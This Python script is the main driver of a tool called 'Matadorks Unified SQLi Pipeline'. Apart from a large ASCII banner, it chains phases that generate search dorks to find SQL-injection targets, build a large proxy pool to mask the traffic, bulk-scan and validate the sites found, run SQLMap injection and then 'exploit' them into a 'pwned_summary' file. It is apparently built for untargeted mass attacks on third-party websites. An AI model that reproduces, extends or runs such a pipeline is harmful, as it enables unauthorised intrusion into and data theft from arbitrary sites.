import os
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from core.logger import Logger
from core.state import State
from core.git_handler import GitHandler
from rich.panel import Panel
from rich.console import Console

import subprocess
import argparse

console = Console()

class MatadorksApp:
    def __init__(self):
        self.state = State()
        self.logger = Logger()
        self.git = GitHandler()
        self.version = "1.0.0"

    def sync_dependencies(self):
        self.logger.status("Synchronizing dependencies with uv...")
        try:
            subprocess.run(["uv", "sync"], check=True)
            self.logger.success("Dependencies synchronized successfully.")
        except FileNotFoundError:
            self.logger.error("uv not found. Please install uv (https://github.com/astral-sh/uv).")
        except subprocess.CalledProcessError as e:
            self.logger.error(f"uv sync failed: {e}")

    def show_banner(self):
        import random
        from rich.panel import Panel
        from rich.console import Console
        
        symbols = ["@", "#", "&", "%"]
        
        # Handcrafted 9-width block letters for MATADORKS
        m = [
            "@#&   @#&",
            "@##& @##&",
            "@#@&#@#&@",
            "@# @@@ #&",
            "@#  @  #&",
            "@#     #&",
            "@#     #&",
            "@#     #&"
        ]
        a = [
            " @#&@#&@ ",
            "@#&   @#&",
            "@#&   @#&",
            "@#&@#&@#&",
            "@#&@#&@#&",
            "@#&   @#&",
            "@#&   @#&",
            "@#&   @#&"
        ]
        t = [
            "@#&@#&@#&",
            "@#&@#&@#&",
            "  @#&@#  ",
            "  @#&@#  ",
            "  @#&@#  ",
            "  @#&@#  ",
            "  @#&@#  ",
            "  @#&@#  "
        ]
        d = [
            "@#&@#&@  ",
            "@#&   @#&",
            "@#&    @#",
            "@#&    @#",
            "@#&    @#",
            "@#&    @#",
            "@#&   @#&",
            "@#&@#&@  "
        ]
        o = [
            " @#&@#&@ ",
            "@#&   @#&",
            "@#&   @#&",
            "@#&   @#&",
            "@#&   @#&",
            "@#&   @#&",
            "@#&   @#&",
            " @#&@#&@ "
        ]
        r = [
            "@#&@#&@  ",
            "@#&   @#&",
            "@#&   @#&",
            "@#&@#&@  ",
            "@#& @#&  ",
            "@#&  @#& ",
            "@#&   @#&",
            "@#&    @#"
        ]
        k = [
            "@#&   @#&",
            "@#&  @#& ",
            "@#& @#&  ",
            "@#&@#&   ",
            "@#& @#&  ",
            "@#&  @#& ",
            "@#&   @#&",
            "@#&    @#"
        ]
        s = [
            " @#&@#&@ ",
            "@#&      ",
            "@#&      ",
            " @#&@#&@ ",
            "      @#&",
            "      @#&",
            "@#&   @#&",
            " @#&@#&@ "
        ]

        letters = [m, a, t, a, d, o, r, k, s]
        
        silhouette = [
            "      .      ",
            "     / \\     ",
            "    (&%&)    ",
            "    #@#@#    ",
            "  _/%&%&%\\_  ",
            " / %&%&%&% \\ ",
            "(&%&%&%&%&%&)",
            " \\%&%&%&%&%/ ",
            "  #@#@#@#@#  ",
            "   /#####\\   ",
            "   |#| |#|   ",
            "   |_| |_|   "
        ]

        # Combine
        banner_lines = []
        for i in range(max(len(silhouette), 8)):
            # Silhouette part
            s_part = silhouette[i] if i < len(silhouette) else " " * 13
            # Letters part
            l_parts = []
            for l in letters:
                l_parts.append(l[i] if i < 8 else " " * 9)
            l_part = " ".join(l_parts)
            
            # Add noise to textured parts and background
            def apply_noise(text, is_bg=False):
                res = ""
                for char in text:
                    if char in "@#&%":
                        res += random.choice(symbols)
                    elif char == " " and is_bg and random.random() < 0.05:
                        res += f"[dim black]{random.choice(symbols)}[/dim black]"
                    else:
                        res += char
                return res

            line = f"[dim red]{apply_noise(s_part)}[/dim red]   [bold red]{apply_noise(l_part, is_bg=True)}[/bold red]"
            banner_lines.append(line)

        banner_text = "\n".join(banner_lines)
        banner_text += "\n\n"
        banner_text += f"[bold white]        M  A  T  A  D  O  R  K  S[/bold white]\n"
        banner_text += f"[dim]        Unified SQLi Pipeline v{self.version}[/dim]"

        console.print(Panel(banner_text, border_style="red", padding=(1, 2)))

    def run_pipeline(self):
        self.show_banner()
        self.logger.info("Starting Matadorks Pipeline...")

        # Phase 1: Dorking
        self.run_phase("Dorking", self.dorking_phase)
        
        # Phase 2: Proxy Building
        self.run_phase("Proxy Building", self.proxy_phase)

        # Phase 3: Scanning
        self.run_phase("Scanning", self.scanning_phase)

        # Phase 4: Validating
        self.run_phase("Validating", self.validating_phase)

        # Phase 5: Injecting
        self.run_phase("Injecting", self.injecting_phase)

        # Phase 6: Exploiting
        self.run_phase("Exploiting", self.exploiting_phase)

        self.logger.success("All phases completed successfully!")
        self.git.commit("Matadorks: Full pipeline execution completed.")

    def run_phase(self, name, func):
        if self.state.get(f"phase_{name.lower()}") == "completed":
            self.logger.info(f"Phase {name} already completed. Skipping.")
            return

        self.logger.status(f"Running Phase: {name}")
        try:
            func()
            self.state.set(f"phase_{name.lower()}", "completed")
            self.logger.success(f"Phase {name} finished.")
            self.git.commit(f"Matadorks: Completed {name} phase.")
        except Exception as e:
            self.logger.error(f"Phase {name} failed: {e}")
            sys.exit(1)

    def dorking_phase(self):
        from modules.dorker import generate_all
        dorks = generate_all()
        output_path = "data/sqli_dorks.txt"
        with open(output_path, "w") as f:
            for d in dorks: f.write(d + "\n")
        self.logger.info(f"Generated {len(dorks)} dorks in {output_path}")

    def proxy_phase(self):
        from core.proxy import get_google_pool
        pool = get_google_pool(auto_build=False)
        self.logger.info("Building proxy pool...")
        pool.build(max_test=5000, workers=200)
        self.logger.info(f"Proxy pool built with {pool.size()} working proxies.")

    def scanning_phase(self):
        from modules.scanner import main as scanner_main
        self.logger.info("Starting bulk scanning...")
        scanner_main(threads=20, amount=50, prefix="matadorks")
        self.logger.success("Scanning completed.")

    def validating_phase(self):
        from modules.validator import main as validator_main
        self.logger.info("Starting target validation...")
        validator_main(input_file="data/matadorks_sqli_targets.txt", output_file="data/validated_targets.txt")
        self.logger.success("Validation completed.")

    def injecting_phase(self):
        from modules.injector import main as injector_main
        self.logger.info("Starting SQLMap injection phase...")
        injector_main(input_file="data/validated_targets.txt", output_file="data/vulnerable_targets.txt")
        self.logger.success("Injection phase completed.")

    def exploiting_phase(self):
        from modules.exploiter import main as exploiter_main
        self.logger.info("Starting exploitation phase...")
        exploiter_main(input_file="data/vulnerable_targets.txt", summary_file="data/pwned_summary.txt", log_file="data/exploitation.log")
        self.logger.success("Exploitation phase completed.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Matadorks Unified SQLi Pipeline")
    parser.add_argument("--sync", action="store_true", help="Sync dependencies using uv")
    args = parser.parse_args()

    app = MatadorksApp()
    
    if args.sync:
        app.sync_dependencies()
    else:
        app.run_pipeline()
